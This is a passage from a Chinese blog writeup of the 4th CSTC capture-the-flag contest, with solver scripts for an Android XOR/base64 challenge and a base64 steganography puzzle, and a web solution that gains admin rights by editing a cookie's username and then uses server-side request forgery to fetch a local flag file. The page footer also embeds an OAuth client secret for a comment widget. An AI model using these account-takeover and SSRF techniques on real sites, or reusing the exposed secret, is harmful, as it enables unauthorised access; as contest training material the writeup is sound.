+<li>先看submitFlag<br><img src="https://upload-images.jianshu.io/upload_images/1386888-c8fe28399c1230db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></li>
+</ol>
+<p>只是校验传入的字符串是否等于CxU+NEhbEVZDaWAmHUAlVgtxZ1lPaCQHBUoKQG4zJlk=，是则返回1</p>
+<ol start="2">
+<li>再看reinforce<br><img src="https://upload-images.jianshu.io/upload_images/1386888-1ff9eb437cd0c704.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>对字符串用passchange函数和encode函数处理后得到返回的字符串</li>
+</ol>
+<p>Passchange 函数：将字符串依次与dest的每个字符异或，注意dest字符串为”my_S3cr3t_P@$$W0rD\0”，长度为0x13<br><img src="https://upload-images.jianshu.io/upload_images/1386888-4a4951ab508cd8fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>Encode函数是一个base64编码功能。<br>解题代码如下：</p>
+<pre><code>import base64
+
+s = &#39;CxU+NEhbEVZDaWAmHUAlVgtxZ1lPaCQHBUoKQG4zJlk=&#39;
+print len(s)
+dest = &#39;my_S3cr3t_P@$$W0rD\0&#39;
+res = base64.b64decode(s)
+result = &#39;&#39;
+for i in xrange(len(res)):
+    result+=chr(ord(res[i])^ord(dest[i%0x13]))
+print result
+
+</code></pre><hr>
+<p>##misc第一题，图片隐写<br>先用binwalk提取出隐藏文件，一个zip和一个txt，zip解压出的文件和txt一样，就不说了。binwalk命令如下：</p>
+<pre><code>binwalk -e xxx.jpg
+</code></pre><p>从stego.txt可以明显看出是base64编码过的，decode后发现有base64隐写。跑脚本找出隐写内容，脚本如下：</p>
+<pre><code>def get_base64_diff_value(s1, s2):
+    base64chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;
+    res = 0
+    for i in xrange(len(s1)):
+        if s1[i] != s2[i]:
+            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
+    return res
+
+def solve_stego():
+
+    with open(&#39;stego.txt&#39;, &#39;rb&#39;) as f:
+        file_lines = f.readlines()
+
+    bin_str = &#39;&#39;
+    for line in file_lines:
+        steg_line = line.replace(&#39;\n&#39;, &#39;&#39;)
+        norm_line = line.replace(&#39;\n&#39;, &#39;&#39;).decode(&#39;base64&#39;).encode(&#39;base64&#39;).replace(&#39;\n&#39;, &#39;&#39;)
+        diff = get_base64_diff_value(steg_line, norm_line)
+
+        pads_num = steg_line.count(&#39;=&#39;)
+        if diff:
+            bin_str += bin(diff)[2:].zfill(pads_num * 2)
+
+        else:
+            bin_str += &#39;0&#39; * pads_num * 2
+
+    res_str = &#39;&#39;
+
+    for i in xrange(0, len(bin_str), 8):
+
+        res_str += chr(int(bin_str[i:i+8], 2))
+    print res_str
+
+solve_stego()
+</code></pre><h2 id="输出内容即为flag内容"><a href="#输出内容即为flag内容" class="headerlink" title="输出内容即为flag内容"></a>输出内容即为flag内容</h2><p>###Web1 转自：<a href="https://www.anquanke.com/post/id/144862#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/144862#h3-3</a><br><a href="http://117.34.117.216/" target="_blank" rel="noopener">http://117.34.117.216</a><br>访问后跳转到登录页面<br><a href="http://117.34.117.216/login.php" target="_blank" rel="noopener">http://117.34.117.216/login.php</a><br>发现有注册，随意注册一个账号，登录后<br><img src="https://upload-images.jianshu.io/upload_images/1386888-2b368f57daf06257.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>发现要以admin的身份访问flag.php<br>查看源代码，发现还有change_password的功能<br><img src="https://upload-images.jianshu.io/upload_images/1386888-a0ae7577786c61e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>同时发现cookie中有username项<br><img src="https://upload-images.jianshu.io/upload_images/1386888-00b941accabd974f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>猜想可能存在越权问题<br>进入修改密码页面：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-72cd56466174237d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>发现未做username的check<br>猜想直接使用了cookie中的username<br>随机修改cookie中的username为admin<br>同时修改密码<br>成功登入，来到管理页面：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-f4c7aec59a96a3d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>发现可以获取远程图片<br>随手测试,发现题目会将远程访问到的页面内容写到本地的图片img目录中<br>尝试访问<br><a href="http://127.0.0.1/flag.php" target="_blank" rel="noopener">http://127.0.0.1/flag.php</a><br>下载图片文件后获得flag：<br><img src="https://upload-images.jianshu.io/upload_images/1386888-9aa019c105d1c7ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>得到flag<br><code>flag{dbf6e52d69973dd16d87d4a8c3816ca9}</code></p>
+<blockquote>
+<p>这道题我做的时候做到最后一步，实在是没想到加载<a href="http://127.0.0.1/flag.php" target="_blank" rel="noopener">http://127.0.0.1/flag.php</a>,<br>我当时写了个<a href="http://localhost/flag.php" target="_blank" rel="noopener">http://localhost/flag.php</a></p>
+</blockquote>
+<h2 id="好气啊！！！！！！！！！！"><a href="#好气啊！！！！！！！！！！" class="headerlink" title="好气啊！！！！！！！！！！"></a>好气啊！！！！！！！！！！</h2><p>第一天晚上的时候，还冲到了并列第一，第二天一道没解出来……最后成绩很烂。就做出来这些题目，好歹进了线下。<br><img src="https://upload-images.jianshu.io/upload_images/1386888-8f31f5b6709ec4d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/1386888-db04410d500b3440.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://kongpingfan.me">平凡</a>
+            </p><p>原文链接：<a href="https://kongpingfan.me/2018/05/14/the_4th_cstc_writeup/">https://kongpingfan.me/2018/05/14/the_4th_cstc_writeup/</a>
+            </p><p>发表日期：<a href="https://kongpingfan.me/2018/05/14/the_4th_cstc_writeup/">May 14th 2018, 11:01:26 am</a>
+            </p><p>更新日期：<a href="https://kongpingfan.me/2018/05/14/the_4th_cstc_writeup/">May 4th 2019, 6:52:03 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/08/23/python_three_kinds_of_methods/" title="python的类方法、实例方法和静态方法">
+                    <div class="nextTitle">python的类方法、实例方法和静态方法</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/05/05/ciscn-2018-writeup/" title="ciscn 2018 第十一届全国大学生信息安全竞赛writeup">
+                    <div class="prevTitle">ciscn 2018 第十一届全国大学生信息安全竞赛writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+<div id="container"></div>
+<link rel="stylesheet" href="https://billts.site/extra_css/gitment.css">
+<script src="https://billts.site/js/gitment.js"></script>
+<script>
+    var gitment = new Gitment({
+        // id: "第四届全国网络空间安全技术大赛 writeup", // 可选。默认为 location.href
+        owner: 'kongpingfan',
+        repo: 'https://github.com/kongpingfan/kongpingfan.github.io.git',
+        oauth: {
+            client_id: 'fe1d682221309cb76b6a',
+            client_secret: '8ab8a6b1fdd4d680430449e70f3b32c721aa342a',
+        },
+    })
+    gitment.render('container')
+
+</script>
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:admin@kongpingfan.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/kongpingfan" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/qrcode.jpg">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-number">1.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re1"><span class="toc-number">2.</span> <span class="toc-text">re1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re2"><span class="toc-number">3.</span> <span class="toc-text">re2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可以推出来就是Hell0-Kitty"><span class="toc-number"></span> <span class="toc-text">可以推出来就是Hell0~Kitty</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc2-wp"><span class="toc-number"></span> <span class="toc-text">misc2 wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number"></span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安卓-基础加密"><span class="toc-number"></span> <span class="toc-text">安卓 基础加密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#输出内容即为flag内容"><span class="toc-number"></span> <span class="toc-text">输出内容即为flag内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#好气啊！！！！！！！！！！"><span class="toc-number"></span> <span class="toc-text">好气啊！！！！！！！！！！</span></a>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 17
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/2019/04/20/Viper源码分析/">golang库——Viper源码分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2019/04/14/GraphQL初探/">GraphQL初探</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/alfred/">MAC下神器alfred的使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href="/2018/11/15/python-logging-module/">python日志记录模块</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href="/2018/11/07/understand-linux-shell-2-1/">理解linux命令 - 2>&1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href="/2018/11/07/understand-linux-shell-command-nohup/">理解linux命令 - nohup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/03</span><a class="archive-post-title" href="/2018/10/03/python-functools-wraps/">python的@functools.wraps</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href="/2018/10/01/python-decorator/">python的装饰器</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/30</span><a class="archive-post-title" href="/2018/09/30/python-property/">python中的@property</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href="/2018/09/29/python-PIL/">python的PIL</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span><a class="archive-post-title" href="/2018/09/19/tencent-school-recruitment-testing/">某次腾讯校招笔试解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/2018/09/05/database-locking/">数据库的锁</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href="/2018/09/01/understanding-MySQL-index/">理解MySQL的索引</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href="/2018/08/31/deal-with-python-re-multipule-line/">python正则的多行匹配问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href="/2018/08/23/python_three_kinds_of_methods/">python的类方法、实例方法和静态方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/14</span><a class="archive-post-title" href="/2018/05/14/the_4th_cstc_writeup/">第四届全国网络空间安全技术大赛 writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/05</span><a class="archive-post-title" href="/2018/05/05/ciscn-2018-writeup/">ciscn 2018 第十一届全国大学生信息安全竞赛writeup</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="tools"><span class="iconfont-archer">&#xe606;</span>tools</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="数据库"><span class="iconfont-archer">&#xe606;</span>数据库</span>
+    
+        <span class="sidebar-tag-name" data-tags="python 正则"><span class="iconfont-archer">&#xe606;</span>python 正则</span>
+    
+        <span class="sidebar-tag-name" data-tags="programming"><span class="iconfont-archer">&#xe606;</span>programming</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="golang"><span class="iconfont-archer">&#xe606;</span>golang</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf writeup"><span class="iconfont-archer">&#xe606;</span>ctf writeup</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="tools"><span class="iconfont-archer">&#xe60a;</span>tools</span>
+    
+        <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
+    
+        <span class="sidebar-category-name" data-categories="programming"><span class="iconfont-archer">&#xe60a;</span>programming</span>
+    
+        <span class="sidebar-category-name" data-categories="linux"><span class="iconfont-archer">&#xe60a;</span>linux</span>
+    
+        <span class="sidebar-category-name" data-categories="MySQL"><span class="iconfont-archer">&#xe60a;</span>MySQL</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "平凡"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
